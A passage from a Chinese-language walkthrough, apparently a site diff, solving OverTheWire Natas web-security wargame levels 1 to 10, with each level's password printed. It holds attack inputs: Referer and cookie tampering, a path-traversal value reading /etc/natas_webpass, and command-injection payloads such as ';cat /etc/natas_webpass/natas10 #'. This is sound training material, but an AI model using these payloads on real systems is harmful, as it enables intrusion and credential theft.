+<img alt="gtVrDuiDfck831PqWsLEZy5gyDz1clto" src="img/natas01.jpg" /></li>
+</ul>
+<h2 id="level-1">Level 1<a class="headerlink" href="#level-1" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas1</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>gtVrDuiDfck831PqWsLEZy5gyDz1clto</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas1.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>提示：<code>You can find the password for the next level on this page, but rightclicking has been blocked!</code>（但是咕咕几乎不怎么用右键查看页面源代码的(╮ŏωŏ)╭）</li>
+<li>使用开发者工具查看页面源代码即可获得下一关的口令<br>
+<img alt="ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi" src="img/natas02.jpg" /></li>
+</ul>
+<h2 id="level-2">Level 2<a class="headerlink" href="#level-2" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas2</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas2.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>提示：<code>There is nothing on this page</code></li>
+<li>查看页面源代码，发现使用了一张<code>files</code>路径下的图片（因为只有 1X1 的大小，所以页面上看不到）<br>
+<img alt="src=&quot;files/pixel.png&quot;" src="img/natas03.jpg" /></li>
+<li>访问 <a href="http://natas2.natas.labs.overthewire.org/files">http://natas2.natas.labs.overthewire.org/files</a> ，发现该路径下还有一个 <em>users.txt</em> 文件，查看该文件获得用户 <em>natas3</em> 的口令
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code># username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+</code></pre></div>
+</td></tr></table></li>
+</ul>
+<h2 id="level-3">Level 3<a class="headerlink" href="#level-3" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas3</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas3.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>这次页面上依然是<code>There is nothing on this page</code>，查看页面源代码，发现一段注释信息：<code>No more information leaks!! Not even Google will find it this time...</code></li>
+<li>
+<p>嗯？怎么能让谷歌抓取不到网站的？</p>
+<blockquote>
+<p>网站所有者可以详细规定处理其网页的方式，申请重新抓取，或使用 robots.txt 文件完全禁止谷歌抓取工具抓取他们的网站</p>
+</blockquote>
+</li>
+<li>
+<p>访问 <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> ，查看 <em>robots.txt</em> 文件
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="c1"># 禁止所有爬虫爬取路径 /s3cr3t</span>
+User-agent: *
+Disallow: /s3cr3t/
+</code></pre></div>
+</td></tr></table></p>
+</li>
+<li>目标指向 <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> ，访问可查看到该路径下的一个 <em>users.txt</em> 文件，其中包含下一关的口令
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+</code></pre></div>
+</td></tr></table></li>
+</ul>
+<h3 id="_1">参考资料<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://www.google.com/intl/zh-CN/search/howsearchworks/crawling-indexing/">Google 搜索的工作方式 | 抓取和编入索引</a></li>
+<li><a href="https://developers.google.com/search/reference/robots_txt">Robots.txt Specifications  |  Search for Developers  |  Google Developers</a></li>
+</ul>
+<h2 id="level-4">Level 4<a class="headerlink" href="#level-4" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas4</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas4.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>进入后提示<br>
+<img alt="Access disallowed." src="img/natas04.jpg" /></li>
+<li>点击 <em>Refresh page</em> 后，从 <a href="http://natas4.natas.labs.overthewire.org">http://natas4.natas.labs.overthewire.org</a> 进入 <a href="http://natas4.natas.labs.overthewire.org/index.php">http://natas4.natas.labs.overthewire.org/index.php</a> ，且提示文本发生变化<br>
+<img alt="You are visiting from &quot;http://natas4.natas.labs.overthewire.org/&quot;" src="img/natas05.jpg" /></li>
+<li>在 HTTP 请求头中包含 <em>Referer</em> 字段，用于标识访问来源，提示信息中 <em>visit from</em> 的意义与值均与 <em>Referer</em> 字段相同，那么将 <em>Referer</em> 字段的值改为<code>http://natas5.natas.labs.overthewire.org/</code>，再次发送 HTTP 请求即可<br>
+<img alt="修改 Referer 字段" src="img/natas06.jpg" /><br>
+<img alt="iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" src="img/natas07.jpg" /></li>
+</ul>
+<h2 id="level-5">Level 5<a class="headerlink" href="#level-5" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas5</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas5.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>进入后提示没有登录！(╥ω╥)<br>
+<img alt="You are not logged in" src="img/natas08.jpg" /></li>
+<li>查看 HTTP 请求头，发现 <em>Cookie</em> 字段为<code>loggedin=0</code>，非常可疑(—ˋωˊ—)！<br>
+<img alt="Cookie: loggedin=0" src="img/natas09.jpg" /></li>
+<li>将<code>loggedin=0</code>修改为<code>loggedin=1</code>并发送 HTTP 请求，成功登录！<br>
+<img alt="The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1" src="img/natas10.jpg" /></li>
+</ul>
+<h2 id="level-6">Level 6<a class="headerlink" href="#level-6" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas6</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas6.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>出现输入框了！<br>
+<img alt="Input secret" src="img/natas11.jpg" /></li>
+<li>先看看源代码
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas6<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+
+<span class="cp">&lt;?</span>
+
+<span class="cp">include &quot;includes/secret.inc&quot;;</span>
+<span class="cp"># 使用的是相对路径</span>
+
+<span class="cp">    if(array_key_exists(&quot;submit&quot;, $_POST)) {</span>
+<span class="cp">        # 需要知道 $secret 的值</span>
+<span class="cp">        if($secret == $_POST[&#39;secret&#39;]) {</span>
+<span class="cp">        print &quot;Access granted. The password for natas7 is &lt;censored&gt;&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        print &quot;Wrong secret&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">    }</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>
+Input secret: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">secret</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>注意到 <em>include</em> 文件使用的是相对路径，访问 <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> ，在网页源代码中看到变量 <em>$secret</em> 的值<br>
+<img alt="FOEIUWGHFEEUHOFUOIU" src="img/natas12.jpg" /></li>
+<li>回到 <a href="http://natas6.natas.labs.overthewire.org">http://natas6.natas.labs.overthewire.org</a> ，输入密码，获得 <em>natas7</em> 的口令<br>
+<img alt="Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9" src="img/natas13.jpg" /></li>
+</ul>
+<h2 id="level-7">Level 7<a class="headerlink" href="#level-7" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas7</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas7.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>首页给出了 <em>Home</em> 和 <em>About</em> 页面的链接，并提示 <em>natas8</em> 的口令存储在<code>/etc/natas_webpass/natas8</code><br>
+<img alt="页面链接和提示" src="img/natas14.jpg" /></li>
+<li>通过 GET 方式传递参数给 <em>index.php</em>，那么除了<code>home</code>和<code>about</code>，随便传一个值试试叭(—ˋωˊ—)<br>
+<img alt="http://natas7.natas.labs.overthewire.org/index.php?page=notexist" src="img/natas15.jpg" /></li>
+<li><code>include()</code>首先查看传入的文件路径（由上图可知，传入<code>include()</code>函数的参数即为 <em>page</em> 变量的值），其次查看定义的<code>include_path</code>，最后检查调用脚本所在的目录和当前工作目录。那么可通过<code>page=/etc/natas_webpass/natas8</code>或<code>page=../../../../etc/natas_webpass/natas8</code>来获得下一关的口令</li>
+</ul>
+<h3 id="_2">参考资料<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p><a href="https://www.php.net/manual/en/function.include.php">PHP: include - Manual</a></p>
+<h2 id="level-8">Level 8<a class="headerlink" href="#level-8" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas8</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas8.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>再次出现输入框，先查看源代码
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas8<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+
+<span class="cp">&lt;?</span>
+
+<span class="cp">$encodedSecret = &quot;3d3d516343746d4d6d6c315669563362&quot;;</span>
+
+<span class="cp">function encodeSecret($secret) {</span>
+<span class="cp">    return bin2hex(strrev(base64_encode($secret)));</span>
+<span class="cp">}</span>
+<span class="cp"># 输入经过 Base64 编码、字符串反转，最后转化为十六进制字符串</span>
+<span class="cp"># 结果要与 $encodedSecret 相等</span>
+<span class="cp">if(array_key_exists(&quot;submit&quot;, $_POST)) {</span>
+<span class="cp">    if(encodeSecret($_POST[&#39;secret&#39;]) == $encodedSecret) {</span>
+<span class="cp">    print &quot;Access granted. The password for natas9 is &lt;censored&gt;&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">    print &quot;Wrong secret&quot;;</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">form</span> <span class="na">method</span><span class="o">=</span><span class="s">post</span><span class="p">&gt;</span>
+Input secret: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">secret</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>对<code>$encodedSecret</code>进行逆操作，以得到要提交的<code>secret</code>的值
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>$ <span class="nb">echo</span> 0x3d3d516343746d4d6d6c315669563362 <span class="p">|</span> xxd -r <span class="p">|</span> rev <span class="p">|</span> base64 -d
+oubWYf2kBq
+</code></pre></div>
+</td></tr></table></li>
+<li>提交即可获取口令<br>
+<img alt="W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl" src="img/natas16.jpg" /></li>
+</ul>
+<h2 id="level-9">Level 9<a class="headerlink" href="#level-9" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas9</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas9.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>要求的输入发生变化了<br>
+<img alt="Find words containing" src="img/natas17.jpg" /></li>
+<li>总之先查看源代码
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas9<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Find words containing: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">needle</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">Search</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+
+Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+<span class="cp">$key = &quot;&quot;;</span>
+
+<span class="cp">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {</span>
+<span class="cp">    $key = $_REQUEST[&quot;needle&quot;];</span>
+<span class="cp">}</span>
+
+<span class="cp">if($key != &quot;&quot;) {</span>
+<span class="cp">    passthru(&quot;grep -i $key dictionary.txt&quot;);</span>
+<span class="cp">}</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>输入没有经过任何处理直接放到命令字符串里了！这样一来，可就不能只执行一个命令了哦~👿提交<code>;cat /etc/natas_webpass/natas10 #</code>，拼接后的命令如下
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code>grep -i <span class="p">;</span>cat /etc/natas_webpass/natas10 <span class="c1"># dictionary.txt</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>成功获得下一关的口令<br>
+<img alt="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu" src="img/natas18.jpg" /></li>
+</ul>
+<h2 id="level-10">Level 10<a class="headerlink" href="#level-10" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas10</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas10.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
+
+<ul>
+<li>这回会过滤掉一些字符(ŏωŏ)<br>
+<img alt="For security reasons, we now filter on certain characters" src="img/natas19.jpg" /></li>
+<li>通过源代码，发现分隔符被过滤掉了(╥ω╥)
+  <table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span></pre></div></td><td class="code"><div class="codehilite"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="c">&lt;!-- This stuff in the header has nothing to do with the level --&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>natas10<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;content&quot;</span><span class="p">&gt;</span>
+
+For security reasons, we now filter on certain characters<span class="p">&lt;</span><span class="nt">br</span><span class="p">/&gt;&lt;</span><span class="nt">br</span><span class="p">/&gt;</span>
+<span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;</span>
+Find words containing: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">needle</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">submit</span> <span class="na">name</span><span class="o">=</span><span class="s">submit</span> <span class="na">value</span><span class="o">=</span><span class="s">Search</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+
+Output:
+<span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
+<span class="cp">&lt;?</span>
+<span class="cp">$key = &quot;&quot;;</span>
+
+<span class="cp">if(array_key_exists(&quot;needle&quot;, $_REQUEST)) {</span>
+<span class="cp">    $key = $_REQUEST[&quot;needle&quot;];</span>
+<span class="cp">}</span>
+
+<span class="cp">if($key != &quot;&quot;) {</span>
+<span class="cp">    # 过滤掉了分隔符</span>
+<span class="cp">    if(preg_match(&#39;/[;|&amp;]/&#39;,$key)) {</span>
+<span class="cp">        print &quot;Input contains an illegal character!&quot;;</span>
+<span class="cp">    } else {</span>
+<span class="cp">        passthru(&quot;grep -i $key dictionary.txt&quot;);</span>
+<span class="cp">    }</span>
+<span class="cp">}</span>
+<span class="cp">?&gt;</span>
+<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
+
+<span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;viewsource&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;index-source.html&quot;</span><span class="p">&gt;</span>View sourcecode<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</td></tr></table></li>
+<li>不过，<code>grep</code>可以同时处理多个文件，那么只要猜测<code>/etc/natas_webpass/natas11</code>文件内容中的一个字符就可以啦~（推荐猜数字(&lt;ゝωΦ)，<em>0-9</em> 就可以，同时 <em>dictionary.txt</em> 文件中也不含数字）<blockquote>
+<p>Usage: grep [OPTION]... PATTERN [FILE]...</p>
+</blockquote>
+</li>
+<li>提交<code>1 /etc/natas_webpass/natas11</code>，惊喜！<br>
+<img alt="/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK" src="img/natas20.jpg" /></li>
+</ul>
+<h2 id="level-11">Level 11<a class="headerlink" href="#level-11" title="Permanent link">&para;</a></h2>
+<table>
+<tbody>
+  <tr>
+    <td>Username</td>
+    <td>natas11</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>Password</td>
+    <td>U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</td>
+  </tr>
+</tbody>
+<tbody>
+  <tr>
+    <td>URL</td>
+    <td>http://natas11.natas.labs.overthewire.org</td>
+  </tr>
+</tbody>
+</table>
